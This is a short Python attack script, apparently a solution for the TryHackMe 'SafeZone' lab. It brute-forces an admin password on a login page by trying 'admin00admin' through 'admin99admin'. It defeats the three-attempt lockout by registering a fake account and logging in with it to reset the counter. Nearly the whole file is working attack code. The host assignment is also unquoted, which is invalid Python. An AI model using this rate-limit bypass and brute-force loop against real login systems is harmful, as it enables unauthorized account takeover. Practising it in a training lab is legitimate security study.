#!/usr/bin/env python3

# TryHackMe room: SafeZone (https://tryhackme.com/room/safezone)
# 
# Description:
#  Bruteforce a login page that blocks after three attempts by
#  bypassing the rate limit (temporarily login with a valid fake account).

import requests
import sys

host = 10.10.10.10 # changeme
login_url = f'http://{host}/index.php'
regis_url = f'http://{host}/register.php'

fake_user = 'user'
fake_pass = 'pass'


# Create valid credential set
def create_account(username, password) -> bool:
	data = {'username':username, 'password':password, 'submit':'Submit'}
	requests.post(regis_url, data=data)
	return login(username, password)

# Attempt login
def login(username, password) -> bool:
	data = {'username':username, 'password':password, 'submit':'Submit'}
	response = requests.post(login_url, data=data)
	if ('attempts remaining' in response.text):
		if ('1 attempts' in response.text):
			# Reset attempts by logging in with valid credentials
			if (not login(fake_user, fake_pass)):
				print(f'\n[!] Error. Resetting attempts failed.')
				sys.exit(0)
			else:
				# everything is fine, moving on
				pass
		else:
			# we still have free tries, moving on
			pass
		return False
	else:
		return True


def main() -> None:

	print(f'[+] Creating account')
	if (create_account(fake_user, fake_pass)):
		print(f'\t[-] Success.')
		print(f'\t[-] Created user: {fake_user}')
		print(f'\t[-] Created pass: {fake_pass}')
	else:
		print(f'[!] Failed to create fake account. Abort.')
		sys.exit(0)

	print(f'[+] Starting brute-force attack...')

	# ! known username: admin
	# ! known password: admin__admin
	# ! known password hint: "__" stands for 2 numbers

	real_user = 'admin'

	for i in range(100):
		password = f'admin{i:02d}admin'
		print(f'\r\t[-] Attempting: [{real_user}:{password}]', end='')
		if (login(real_user, password)):
			print('\n\t[#] SUCCESS.')
			sys.exit(1)
		else:
			# wrong credentials
			pass

	print(f'\n[+] Passwords exhausted. Shutting down.')
	sys.exit(1)

if __name__ == '__main__':
	main()
